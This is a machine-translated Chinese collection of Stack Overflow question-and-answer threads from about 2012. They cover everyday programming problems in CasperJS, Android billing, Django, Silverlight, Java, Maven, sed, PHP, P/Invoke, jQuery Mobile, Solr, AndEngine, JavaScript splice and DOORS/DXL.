有没有办法在不指定下载 URL 的情况下使用 casperjs 下载 CSV 文件？我正在尝试下载单击下载按钮时动态生成其 URL 的 CSV 文件。因此，在这种情况下，我可能无法很好地使用 download()。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2014-10-13T06:22:01.993

作为记录，已经可以使用“resource.received”事件。如果您收到这样的标题：

> 内容处置：附件；文件名="导出数据.csv"

可以使用以下事件侦听器下载生成的文件：

```
casper.on('resource.received', function(resource) {
    if (resource.stage !== "end") {
        console.log("resource.stage !== 'end'");
        return;
    }
    if (resource.url.indexOf('ExportData.csv') > -1) {
        console.log("Downloading csv file");
        this.download(resource.url, 'ExportData.csv');
    }
}); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-05-14T15:24:04.760

我已经找到了解决方案。它不是很干净，但它有效：

您需要构建一个全局数组，它将每个 resource.received 关联一个附加的文件名。

```
fileInfos[url]= parse_filename_from_responseHeader(resource) 
```

如果 url 是您要下载的资源，请先尝试 open(url)。这将触发 resiyrce.received 事件，解析头部并更新全局数组。

现在，在启动之前`casper.download(url)`，寻找`fileInfos[url]`.

您将在 fileInfos 数组中找到与 url 对应的文件名。如果需要，我可以详细说明解决方案，但由于这个问题已经存在几年了，

我会等待下一次戳详细说明。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-18T06:05:13.043

在解决这个 phantomjs 问题之前，这是不可能的[http://code.google.com/p/phantomjs/issues/detail?id=52](http://code.google.com/p/phantomjs/issues/detail?id=52)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2017-09-06T15:50:51.627

我会做的是这样的事情，但我知道我将收到的文件名：

```
this.waitForResource(function check(resource){
            res = resource;    
            // regular expression to test
            return /thefilename/.test(resource.url);
        }, function(){
            this.echo("Resource found: " + res.url);
            // download the file
            this.download(res.url, path);
        }, null, 10000); 
```

# android - 在应用计费项目中未找到错误？

> ID：12461097
> 
> 赞同：3
> 
> 时间：2012-09-17T14:10:09.693
> 
> 标签：android, in-app-purchase

我一直在尝试在我的应用中实现谷歌播放的应用计费。我正在尝试实现示例应用程序并对其进行测试。我已遵循[http://developer.android.com/guide/google/play/billing/billing_integrate.html](http://developer.android.com/guide/google/play/billing/billing_integrate.html)中的所有程序，但我仍然无法从市场购买任何产品或订阅。我的回应如下所示

[09-17 19:38:31.902: E/Volley(4314): [444] BasicNetwork.performRequest: https://android.clients.google.com/fdfe/details?doc=subs:com](https://android.clients.google.com/fdfe/details?doc=subs:com.product.android.dungeons:subscription_monthly)的意外响应代码 500 。 [product.android.dungeons:subscription_monthly](https://android.clients.google.com/fdfe/details?doc=subs:com.product.android.dungeons:subscription_monthly)

任何人都可以帮我解决这个问题，这让我过去一周都头晕目眩。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-17T14:40:44.190

应用内计费系统非常脆弱，这就是为什么很多人会推荐你使用[AndroidBillingLibrary](https://github.com/robotmedia/AndroidBillingLibrary)的原因。除此之外，您还应该检查以下几点：

*   您是否在开发控制台中创建了您的项目？
*   在开发控制台和您的应用程序中，您的项目的 id 是否相同？
*   你的作品发表了吗？
*   自发布项目以来，您是否至少等待了几个小时？
*   您是否使用与您的开发帐户不同的 Google 帐户进行购买？
*   您是在真实设备而不是模拟器上进行测试吗？
*   您使用的是签名的 APK 吗？

如果这些问题中的任何一个回答为“否”，您可能需要解决这个问题。

# django - Django 检测具有相同文件名的已更改 ImageField

> ID：12461100
> 
> 赞同：3
> 
> 时间：2012-09-17T14:10:20.017
> 
> 标签：django

我正在尝试检测对 ImageField 的更改，以便以编程方式将更改与 Hg 同步。包含 ImageField 的模型正在使用 Django 多语言进行本地化，因此我必须单独检测每个字段的更改，而不是假设文件每次都更改。

我正在使用 pre 和 post save 信号来完成此操作，将实例保存在 pre-save 中并检测 post-save 中字段值的变化。这适用于使用不同文件名的图像添加、删除或更改图像时。但是，当我上传具有相同文件名的图像时，我的代码无法检测到图像实际发生了变化，因此没有文件更改与 Hg 同步。

我希望能够为旧文件生成校验和（很容易完成，因为我知道它在 presave 实例中的位置），并将其与新文件的校验和进行比较（不像试图从字段值将我带到旧文件）。

如果有办法让我找到新上传的文件（大概在内存中，因为 Django 不会将文件临时保存在 2.5MB 以下），并将其保存到临时目录，我很容易为它生成校验和. 但是，我不确定从哪里获取文件。

在 post_save 信号期间我可以从哪里获取文件？还是有另一种我没有想到的完成这种变化检测的方法？

谢谢，丰富

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-01T11:33:40.050

添加此片段”

```
def has_changed(instance, field):
        if not instance.pk:
            return False
        old_value = instance.__class__._default_manager.\
                 filter(pk=instance.pk).values(field).get()[field]
        return not getattr(instance, field) == old_value 
```

然后在你的保存中

```
def save(self, *args, **kwargs):
            if has_changed(self, 'field_here'):

            super(Sneetch, self).save(*args, **kwargs) 
```

# silverlight - 您可以将 Silverlight 应用程序置于 Kiosk 模式吗？

> ID：12461103
> 
> 赞同：2
> 
> 时间：2012-09-17T14:10:25.090
> 
> 标签：silverlight, silverlight-5.0

是否可以告诉浏览器外的`Silverlight`应用程序运行`kiosk mode`？

我可以将其设置为全屏，但我们是否可以禁用允许使用键盘的用户与 Windows 交互的击键，例如`ctrl`+ `alt`+ `del`、`alt`+ `tab`、`ctrl`+`esc`等？

这是针对将在触摸屏平板电脑上全屏运行的应用程序，大多数情况下屏幕上不会有键盘，但有一个`Connect to Facebook`功能会弹出一个键盘供他们使用来登录 -在。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-20T08:00:14.410

您需要将您的应用程序安装为受信任的 Silverlight 应用程序。见参考：

[http://msdn.microsoft.com/en-us/library/cc189023(v=vs.95).aspx](http://msdn.microsoft.com/en-us/library/cc189023(v=vs.95).aspx)

## 具有可信应用程序的全屏模式

全屏消息、用户启动要求、键盘限制和对话框限制不适用于受信任的应用程序。此外，受信任的应用程序在使用 StaysFullScreenWhenUnfocused 设置时不会显示用户同意对话框。

在受信任的应用程序中，您可以在 Application.Startup 或 FrameworkElement.Loaded 事件处理程序中进入全屏模式。但是，您必须通过在传递给 Dispatcher.BeginInvoke 方法的委托中设置 IsFullScreen 属性来执行此操作。

由于 ESC 键对受信任的应用程序没有内置效果，因此您可以将其用于自己的目的。在这种情况下，您应该实施并记录替代方案，以便用户可以退出全屏模式。

# java - 我怎样才能得到所有的字符串值 Java网页上的标签？

> ID：12461104
> 
> 赞同：0
> 
> 时间：2012-09-17T14:10:25.967
> 
> 标签：java, android, html

我需要找到一种方法来`<p>`使用 Java 提取网站标签的字符串值。我见过一些人用 Javascript 做类似的事情，但我希望找到一种使用 Java 的方法。我正在尝试为网站制作应用程序，所有新闻帖子都在`<p>`标签内，而不是 RSS 提要。

谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-17T14:14:48.553

考虑使用[Jsoup](http://jsoup.org/)来执行任务，有了它，任务可以像

```
for(Element e: doc.getElementsByTag("p")) {
    System.out.println(e.text());
} 
```

# java - 使用源代码创建可执行 jar 以进行调试

> ID：12461105
> 
> 赞同：2
> 
> 时间：2012-09-17T14:10:28.310
> 
> 标签：java, maven, jar

我知道如何使用 maven 的源代码创建一个 JAR 文件，并且还创建一个可执行的 JAR。但我的问题是，是否有任何方法可以创建还包含源代码的可执行 JAR（因此它包含所有 .class 文件）（因此对于每个 .class 其对应的 .java 文件）。

我想用 Eclipse 进行调试，因为我的 Maven 项目是另一个项目的库，并且在调试更大的项目时，当执行到达我的库时我会失去跟踪，因为 JAR 中缺少源代码。我在这个论坛中找到了一个解决方案，建议创建两个 jar，一个是可执行文件，另一个是 .java 文件，并将 IDE 中的源路径设置为指向代码 JAR，但我想使用唯一的 JAR两个。那可能吗？如果不是使用 maven 和另一个 java 工具？例如合并两个 JAR 文件？

非常感谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-17T14:54:30.473

您可以将源目录声明为附加资源目录

```
<build>
    <resources>
        <resource>
            <directory>${project.build.sourceDirectory}</directory>
        </resource>
        <resource>
            <directory>src/main/resources</directory>
        </resource>
    </resources>
</build> 
```

这会将 java 文件放在类文件旁边 - 我不知道您的 IDE 是否支持使用这种结构进行调试。通常@Brian Agnew 建议的方法是要走的路。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-17T14:16:22.700

我会认为，如果您使用 Maven，您可以将二进制文件创建为一个可部署的文件，并将源 jar 文件创建为另一个文件。这样，您的 IDE 应该能够透明地加载与您正在使用的二进制 jar 对应的源（在 IDE 中，它给了我一个“下载”选项）。

有关更多信息，请参阅[此链接](http://www.avajava.com/tutorials/lessons/how-do-i-generate-and-deploy-a-source-jar-file-for-my-project.html)。

> maven-source-plugin 可用于为项目生成源代码 jarW 文件。将此源 jar 部署到远程存储库对其他开发人员很有用，以便他们可以“附加源”并调试到项目源代码中。

# sed - SED 保存 60k+ 备份文件

> ID：12461111
> 
> 赞同：1
> 
> 时间：2012-09-17T14:10:54.463
> 
> 标签：sed

我有很多 sed 命令要做，并解析很多文件，所以它会生成很多备份文件（60k+） 我想 sed 编辑文件，但不做备份。或者将备份保存到单个文件中，每次执行新命令时都会覆盖它。之后尝试添加任何内容都会为`-i`我生成一个带有另一个扩展名的备份文件。

删除所有`*.`文件（sed 使备份不带扩展名）可能需要很长时间。

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T14:17:33.837

将要

```
sed -i /dev/null ... 
```

为你工作？

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-17T14:15:15.793

尝试以下操作：

```
sed -i ''  .... 
```

# php - 检查文件是否为文本文件的PHP函数

> ID：12461113
> 
> 赞同：1
> 
> 时间：2012-09-17T14:11:00.397
> 
> 标签：php, function

所以我为学校做了这个文件编辑任务，我的老师对结果很满意。然而，他有一件事想让我改变：

目前我正在读取目录中的每个文件，但如果我想让它可编辑，我会检查每个扩展名。这意味着每次需要添加新扩展时，我都必须在 if 语句中添加扩展。

我的老师告诉我，如果文件是 .html、.css、.php 等文本文件，则有一个函数返回 true，如果文件是 .exe、.gif 等，则返回 false。他懒得给我函数的名字。

所以..它叫什么名字？我一直在尝试查找它，但我找不到函数的名称..

编辑：

很好，哈哈，他不懒

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-17T14:18:31.637

**引用：**

试试[finfo_file()](http://php.net/manual/en/function.finfo-file.php)函数。

这是一个描述其用法的博客：[使用 PHP 进行智能文件类型检测](http://designshack.net/articles/php-articles/smart-file-type-detection-using-php)

**摘自：** [如何使用 PHP 判断文件是否为文本？](https://stackoverflow.com/questions/3670593/how-can-i-tell-if-a-file-is-text-using-php)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-17T14:18:41.360

`$ext = pathinfo($file_name, PATHINFO_EXTENSION);`[Pathinfo](http://php.net/manual/en/function.pathinfo.php "路径信息")然后检查 $ext。

# asp.net - 调用 PInvoke OpenSqlFilestream 函数使堆栈不平衡

> ID：12461115
> 
> 赞同：0
> 
> 时间：2012-09-17T14:11:06.000
> 
> 标签：asp.net, asp.net-mvc-3, asp.net-mvc-2, sql-server-2008-r2, filestream

我正在使用 SQL Server 的 Filestream 功能。当我尝试访问以下方法时：

```
[DllImport("sqlncli10.dll", SetLastError = true, CharSet = CharSet.Unicode, CallingConvention = CallingConvention.Cdecl)]
private static extern SafeFileHandle OpenSqlFilestream(string path, uint access, uint options, byte[] txnToken, uint txnTokenLength, Sql64 allocationSize);

SafeFileHandle handle = OpenSqlFilestream(filePath, (uint)access, 0, txnToken, (uint)txnToken.Length, new Sql64(0)); 
```

是调用方法。

对 PInvoke OpenSqlFilestream 函数的调用使堆栈不平衡。这可能是因为托管 PInvoke 签名与非托管目标签名不匹配。检查 PInvoke 签名的调用约定和参数是否与目标非托管签名匹配。

可能是什么原因？

我正在使用 Visual Studio 2010

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2015-03-22T12:55:10.387

尝试这个：

```
[DllImport( "sqlncli11.dll", SetLastError = true, CharSet = CharSet.Unicode )]  //sqlncli10.dll

private static extern SafeFileHandle OpenSqlFilestream(String filestreamPath, UInt32 desiredAccess, UInt32 openOptions, Byte[] filestreamTransactionContext, UInt32 filestreamTransactionContextLength, Int64 allocationSize ); 
```

# javascript - jQuery Mobile 获取当前页面

> ID：12461117
> 
> 赞同：21
> 
> 时间：2012-09-17T14:11:16.833
> 
> 标签：javascript, cordova, jquery-mobile

我正在使用 jQuery Mobile 1.1.1 和 Apache Cordova 2.0.0。我希望我的应用程序在我按下后退按钮时退出，但前提是当前页面的 ID = feedZive。我正在使用以下代码来做到这一点：

```
function onDeviceReady(){
    document.addEventListener("backbutton", onBackKeyDown, false);
    function onBackKeyDown(){
        if ($.mobile.activePage.is("#feedZive")){
            navigator.app.exitApp();
        }
        else{
            navigator.app.backHistory();
        }

    }
}; 
```

但是看起来我无法获取当前页面，因为我尝试了以下代码：

```
var activePage = $.mobile.activePage;
alert(activePage); 
```

我的警报显示未定义。我也尝试过更改`$.mobile.activePage`，`$.mobile.activePage.attr("id")`但没有成功。

* * *

## 回答 #1

> 赞同：46
> 
> 时间：2012-09-24T11:25:58.263

```
$(document).live('pagebeforeshow', function() {
    alert($.mobile.activePage.attr('id'));
});​ 
```

[http://jsfiddle.net/ajD6w/5/](http://jsfiddle.net/ajD6w/5/)

* * *

## 回答 #2

> 赞同：18
> 
> 时间：2012-09-17T20:39:44.343

尝试使用

```
var activePage = $.mobile.activePage.attr("id"); 
```

我为你做了一个工作 jsfiddle [http://jsfiddle.net/Z5Uze/1/](http://jsfiddle.net/Z5Uze/1/)

* * *

## 回答 #3

> 赞同：11
> 
> 时间：2014-04-23T18:03:07.753

我意识到这是一个旧线程，所以这可能是最近添加的。

你有没有尝试过：

```
var activePage = $.mobile.pageContainer.pagecontainer("getActivePage");
if(activepage[0].id == yourpageid)
{ /*do something here*/ } 
```

或其他方式：

```
var activePage = $.mobile.activePage.attr('id')
if(activepage == yourpageid)
{ /*do something here*/ } 
```

* * *

## 回答 #4

> 赞同：6
> 
> 时间：2012-09-17T14:58:14.623

试试这个，它对我有用：

```
var activePage = $.mobile.activePage[0].id; 
```

这是一个带有警报的小提琴：http: [//jsfiddle.net/9XThY/3/](http://jsfiddle.net/9XThY/3/)

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2013-04-23T17:51:20.697

```
$(document).ready(function() {

//exit when back button pressed on home screen
document.addEventListener("deviceready", function() {
    document.addEventListener("backbutton", function() {
        if ($.mobile.activePage.attr('id') == "home") {
            navigator.app.exitApp();
        } else {
            navigator.app.backHistory();
        }
    }, false);
}, false); 
```

});

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2015-06-18T14:25:49.407

我们这样做：

```
$(document).on("pagecontainershow", function() {
    var activePage = $.mobile.pageContainer.pagecontainer("getActivePage");

    var activePageId = activePage[0].id;

    if(activePageId != 'splashPage') { //fix rotation splash flash bug
        $("#splashPage").hide();
    } else {
        $("#splashPage").show();
    }

    switch(activePageId) {
        case 'loginPage':
            loginPageShow();
            break;
        case 'notificationPage':
            notificationPageShow();
            break;
        case 'postPage':
            postPageShow();
            break;
        case 'profilePage':
            profilePageShow();
            break;
        case 'splashPage':
            splashPageShow();
            break;
        case 'timelinePage':
            timelinePageShow();
            break;
        default:
            break;
    }
}); 
```

导航是这样工作的：

```
 $.mobile.loading('hide');
    $(":mobile-pagecontainer").pagecontainer("change", "#timelinePage", {
        transition: 'none'
    }); 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2014-08-26T20:01:00.787

jquery mobile 1.4.3 友好...

```
$(document).on('pagebeforeshow', function () {
    var URL = $.mobile.path.parseUrl(window.location).toString().toLowerCase();

    alert(URL);
}); 
```

* * *

## 回答 #8

> 赞同：-2
> 
> 时间：2012-09-18T10:50:14.133

这两种解决方案都很好，但我需要把它放在 document.ready(function()

```
$(document).ready(function(){
var activePage = $.mobile.activePage[0].id;
alert(activePage);
}); 
```

# php - 使用跟踪代码对 HTML 文件中的每个链接进行后缀

> ID：12461119
> 
> 赞同：0
> 
> 时间：2012-09-17T14:11:22.217
> 
> 标签：php, html, regex

我想用 Google Analytics 跟踪代码对 HTML 文件中的每个链接进行后缀。整个 HTML 包含在 $content 变量中。是否可以将此跟踪代码添加到除 mailto 之外的所有链接？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T14:19:26.813

不，你不能这样做——至少不可靠。HTML 是非常上下文相关的，这意味着您需要一个真正的解析器来实现这一点。正则表达式可能涵盖许多情况，但最终会出现误报（您的正则表达式匹配不是真正链接的内容）和误报（错过了真正的链接）。请参阅我的 Pony 评论中的链接以获得更彻底的……嗯……“解释”。

如果你真的必须通过最终的 HTML 并对其进行后处理，最好的办法是找到一个合适的 HTML 解析器（在紧要关头，`DOMDocument`可能会这样做：IIRC，它可以解析 XML 和 HTML），遍历 DOM 树并根据需要替换链接，然后将树渲染回字符串。

理想情况下，您有一个 HTML 感知模板系统（例如 XSLT），在这种情况下，您可能会在流程的早期拦截 DOM 树，这意味着您可以跳过额外的解析和渲染步骤，直接进入 DOM树。

# java - Java 堆空间崩溃 Solr 查询

> ID：12461123
> 
> 赞同：3
> 
> 时间：2012-09-17T14:11:36.813
> 
> 标签：java, solr, lucene

我不是 Java 人，但使用 Solr 进行搜索，但是在搜索了这个问题之后，我找不到它发生的原因。

我有一个没有排序的 3000 万条记录索引，并且是我能做的最简单的设置，但经过几次查询后出现以下异常：

> 严重：java.lang.OutOfMemoryError：org.apache.lucene.index.SegmentReader.fakeNorms(SegmentReader.java:1125) 处 org.apache.lucene.index.SegmentReader.createFakeNorms(SegmentReader.java:1117) 处的 Java 堆空间org.apache.lucene.index.SegmentReader.norms(SegmentReader.java:1140) 在 org.apache.solr.search.SolrIndexReader.norms(SolrIndexReader.java:282) 在 org.apache.lucene.search.TermQuery$TermWeight。 scorer(TermQuery.java:72) at org.apache.lucene.search.IndexSearcher.search(IndexSearcher.java:250) at org.apache.lucene.search.Searcher.search(Searcher.java:171) at org.apache .solr.search.SolrIndexSearcher.getDocListNC(SolrIndexSearcher.java:988) 在 org.apache.solr.search.SolrIndexSearcher.getDocListC(SolrIndexSearcher.java:884) 在 org.apache.solr.search.SolrIndexSearcher.search(SolrIndexSearcher.java:341) 在 org.apache.solr.handler.component.QueryComponent.process(QueryComponent.java:182) 在 org.apache.solr.handler.component.SearchHandler.handleRequestBody(SearchHandler.java:195) 在 org.apache .solr.handler.RequestHandlerBase.handleRequest(RequestHandlerBase.java:131) 在 org.apache.solr.core.SolrCore.execute(SolrCore.java:1317) 在 org.apache.solr.servlet.SolrDispatchFilter.execute(SolrDispatchFilter.java :338) 在 org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:235) 在 org.apache.catalina.core 的 org.apache.solr.servlet.SolrDispatchFilter.doFilter(SolrDispatchFilter.java:241)。 ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206) 在 org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:233) 在 org.apache。catalina.core.StandardContextValve.invoke(StandardContextValve.java:191) at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:127) at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java: 102) 在 org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:293) 在 org.apache.coyote.http11.Http11Processor 的 org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:109) .process(Http11Processor.java:859) 在 org.apache.coyote.http11.Http11Protocol$Http11ConnectionHandler.process(Http11Protocol.java:602) 在 org.apache.tomcat.util.net.JIoEndpoint$Worker.run(JIoEndpoint.java :489) 在 java.lang.Thread.run(Thread.java:679)在 org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:109) 的 org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:109) 的调用（StandardHostValve.java:127）。 .catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:293) 在 org.apache.coyote.http11.Http11Processor.process(Http11Processor.java:859) 在 org.apache.coyote.http11.Http11Protocol$Http11ConnectionHandler.process(Http11Protocol .java:602) 在 org.apache.tomcat.util.net.JIoEndpoint$Worker.run(JIoEndpoint.java:489) 在 java.lang.Thread.run(Thread.java:679)在 org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:109) 的 org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:109) 的调用（StandardHostValve.java:127）。 .catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:293) 在 org.apache.coyote.http11.Http11Processor.process(Http11Processor.java:859) 在 org.apache.coyote.http11.Http11Protocol$Http11ConnectionHandler.process(Http11Protocol .java:602) 在 org.apache.tomcat.util.net.JIoEndpoint$Worker.run(JIoEndpoint.java:489) 在 java.lang.Thread.run(Thread.java:679)connector.CoyoteAdapter.service(CoyoteAdapter.java:293) at org.apache.coyote.http11.Http11Processor.process(Http11Processor.java:859) at org.apache.coyote.http11.Http11Protocol$Http11ConnectionHandler.process(Http11Protocol.java: 602) 在 org.apache.tomcat.util.net.JIoEndpoint$Worker.run(JIoEndpoint.java:489) 在 java.lang.Thread.run(Thread.java:679)connector.CoyoteAdapter.service(CoyoteAdapter.java:293) at org.apache.coyote.http11.Http11Processor.process(Http11Processor.java:859) at org.apache.coyote.http11.Http11Protocol$Http11ConnectionHandler.process(Http11Protocol.java: 602) 在 org.apache.tomcat.util.net.JIoEndpoint$Worker.run(JIoEndpoint.java:489) 在 java.lang.Thread.run(Thread.java:679)

然后我重新启动tomcat，它会重新开始工作，直到有几个请求再次下降。

我没有排序（即使我希望它）和搜索操作系统大部分时间都是按特定的索引字段（不是所有的）。

你可以帮帮我吗？提前致谢 ：）

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-17T16:08:10.923

对于具有几百万条记录的 Solr 部署来说，128 MB 似乎很低。您确实可以使用`-Xmx`. 只是更改了调整堆大小的`-XX:MinHeapFreeRatio`点，但您也可以使用`-Xms`与直接分配最大大小相同`-Xmx`的值并避免任何调整大小。

但是，您可能希望尝试为堆确定更精确的值，而不是盲目地投入更多内存，因为过多的内存可能会适得其反，因为垃圾回收期间的暂停时间更长。使用 JVisualVM（更好的是，使用 VisualGC 插件）或`jstat`在命令行上，您可以看到 Solr 在启动后使用了多少内存，在请求后使用了多少，以及在您的典型使用过程中它的堆通常如何变化。

例如，使用`jstat -gcutil <PID>`，您可以看到 JVM 的年轻代（E，如 Eden）和老代 (O) 有多满（首先应该查看的是老一代）。或者使用`jstat -gc <PID>`，您将获得值而不是百分比（C 列是容量，即最大值，U 列是实际使用量）。您需要为 Solr 的工作集提供足够的内存以及处理请求所需的内存。使用该信息，您可以更精细地调整所需的内容。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-17T14:12:59.683

看来您的代码中有内存泄漏。您可能需要进行堆转储以查看哪些对象正在消耗内存。

（或者）

正如布赖恩所说，您可能会以较少的内存配置启动tomcat。使用 -Xms 和 -Xmx 命令检查您为 tomcat 分配了多少内存。

# listbox - WindowsPhone 不刷新/更新列表框

> ID：12461126
> 
> 赞同：0
> 
> 时间：2012-09-17T14:11:43.030
> 
> 标签：listbox, tableview

我正在编写一个应用程序，我在本地网络中创建了一个 Web 服务。我能够获取 android、wp7.1 和 ios5 中的服务提供的资源。

但我面临一个问题，在 wp7.1 和 ios5 中分别刷新列表框和 uitableview 控制器。

实际上，数据源在这两个平台上都得到了更新，但它没有刷新/更新非常重要的视图。

如果任何专家深入了解我的问题，请帮助我解决此问题。如果任何机构有与根据 Web 服务更新视图相关的示例代码，请提供帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-22T07:53:35.427

我在 wp7 中有一个解决这个问题的方法。可能是您的 Web 服务调用从 catch 获取同一服务调用的数据。尝试添加当前时间以将您的 Web 服务请求显示为新的。像 ".....?¤ttime=...." 试试这个。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-09T02:53:47.310

你提到了视图和控制器，所以我猜你正在使用某种形式的 MVVM 模式。

为了让控制器更新视图，必须发生一些事情：

1.  控制器必须是视图的 DataContext。大多数 MVVM 框架都会为您处理这个管道。

2.  视图中的列表框绑定的控制器属性必须调用 NotifyPropertyChanged 或者必须是 ObservableCollection。

# android - AndEngine如何卸载资源？

> ID：12461127
> 
> 赞同：0
> 
> 时间：2012-09-17T14:11:43.703
> 
> 标签：android, andengine

我注意到在关闭 AndEngine 的 SimpleBaseGame 活动后，所有常见的活动都运行得很慢，如果我再次启动 AndEngine 活动，它的运行速度也很慢。好像还有一些数据留在内存中。我试着用这个：

```
@Override
protected void onStop() {
    super.onStop();
    unloadTextures();
    finish();
}

protected void unloadTextures() {
    for (IEntity entity : objects) {
        if (entity != null) {
            entity.detachSelf();
        }
    }
    for (ITexture atlas : atlases) {
        textureManager.unloadTexture(atlas);
    }
} 
```

但这无济于事。请告诉我如何正确卸载资源？我找到了 GLES1 的解决方案，但在这里不起作用。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-18T08:29:18.243

Ok, that was my mistake. Seems that once launched Thread keeps running even if object is destroyed. When I stop it manually, everything is ok. If code above wouldn't enough, look here: [http://www.andengine.org/forums/post39655.html#p39655](http://www.andengine.org/forums/post39655.html#p39655)

# javascript - 为什么拼接方法有这种奇怪的行为？

> ID：12461133
> 
> 赞同：1
> 
> 时间：2012-09-17T14:12:22.257
> 
> 标签：javascript, angularjs

在我的应用程序中，我需要从数组中删除一个元素。但是我是 JS 的新手。我在网上搜索，每篇博文都在谈论 splice() 方法。所以我考虑使用它，但它有一个非常奇怪的行为。

我在这里找到的帖子：http: [//www.w3schools.com/jsref/jsref_splice.asp](http://www.w3schools.com/jsref/jsref_splice.asp) http://viralpatel.net/blogs/javascript-array-remove-element-js-array-delete-element/

这是我的测试：

```
it("should delete all elements in array", function () {
    var ary = new Array();

    for (i = 0; i < 10; i++) {
        ary[i] = Math.random();
    }

    expect(ary.length).toBe(10);

    for (i = 0; i < 10; i++) {
        ary.splice(i, 1);
    }

    expect(ary.length).toBe(0);

}); 
```

这是测试的结果：

```
 Firefox 15.0.1 Linux: Run 7 tests (Passed: 6; Fails: 1; Errors 0) (44.00 ms)
    should delete all elements in array failed (5.00 ms): Error: Expected 5 to be 0. 
```

我使用角度 JS。

非常感谢您的回复。这是另一个没有通过的测试：

```
var ary = new Array();

        ary = ['a', 'b', 'c', 'd'];

        ary.splice(0, 1);

        ary.splice(1, 1);

        ary.splice(2, 1);

        ary.splice(3, 1);

        expect(ary.length).toBe(0);

Firefox 15.0.1 Linux: Run 7 tests (Passed: 6; Fails: 1; Errors 0) (49.00 ms)
    Posting server policy.should delete all elements in array failed (5.00 ms): Error: Expected 2 to be 0. 
```

正如@Matteo Tassinari 建议的那样，应该删除所有元素吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-17T14:15:47.583

原因很简单：每个新`splice`数组都会变短：

```
var arr = [1, 2, 3];
arr.splice(0, 1);
console.log(arr[0]); // 2
console.log(arr[2]); // undefined
console.log(arr.length); // 2 
```

在您的代码的第二个循环中，您`splice`的数组只会更改五次。但是第六次（何时`i`等于 5），`arr.splice(5, 1)`操作将有效地导致无操作，因为您的数组已经只有 5 个元素。

您可以像在@MatteoTassinari 答案中那样修复它，或者只使用`splice(0, 1)`（或只是`shift()`）而不是`splice(i, 1)`.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-17T14:17:24.963

为此，您需要始终删除 index 处的元素`0`。否则，在`8`元素之后，你会这样做`ary.splice(8, 1)`，并且鉴于此时，数组只剩下`2`元素，`arr.splice(8, 1)`不会删除任何元素，因为索引`8`不再存在。

```
for (i = 0; i < 10; i++) {
    ary.splice(0, 1);
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-17T14:18:07.193

当您拼接数组中的元素时，数组会变短。因此，循环的最后 5 次迭代会尝试拼接不存在的元素。

如果您将代码更改为：

```
for (i = 0; i < 10; i++) {
    ary.splice(0, 1);
} 
```

它会按您的单元测试的预期工作。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-09-17T14:15:43.330

尝试替换这个：

```
for (i = 0; i < 10; i++) {
    ary.splice(i, 1);
} 
```

有了这个：

```
for (i = 0; i < 10; i++) {
    ary.splice(0, 1);
} 
```

要删除特定元素，例如：

```
ary = ['a', 'b', 'c', 'd']; 
```

如果您想删除“c”，只需执行以下操作：

```
ary.splice(2, 1); 
```

事实上，这里的 2 是必须删除的元素的从 0 开始的索引。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-09-17T14:20:24.767

当`splice`您创建数组时（并删除一个数组元素），您还可以向前“移动”所有其他数组元素。

在任何拼接之前考虑这个数组：

```
ary = [0,1,2,3,4,5,6,7,8,9] 
```

之后`ary.splice(0,1)`，它看起来像这样：

```
ary = [1,2,3,4,5,6,7,8,9], 
```

请注意，第 0 个索引 ( `ary[0]`) 现在是`1`，当您继续执行 a 时`ary.splice(1, 1)`，您*不会*删除第一个元素，而是实际上删除了*第二个*元素（`2`在这种情况下）

我知道这不是您要的，但是“重置”阵列的更有效方法是执行以下两件事之一：

```
ary.length = 0;
// or:
ary = []; 
```

# scripting - (DOORS/DXL) 从一个模块进行多次读取会导致服务器端的多次操作吗？

> ID：12461143
> 
> 赞同：1
> 
> 时间：2012-09-17T14:12:53.500
> 
> 标签：scripting, ibm-doors

我正在尝试设计我的 DOORS/DXL 脚本以提高服务器使用率。我想知道从模块中多次读取某些值是否会导致多个服务器操作。

这是一些伪代码

```
for N objects in aModuleOtherThanTheCurrentlyOpenModule{
      read object N's text
} 
```

假设 N = 100 万。这会导致对服务器的 100 万次访问吗？

谢谢

* * *

## 回答 #1

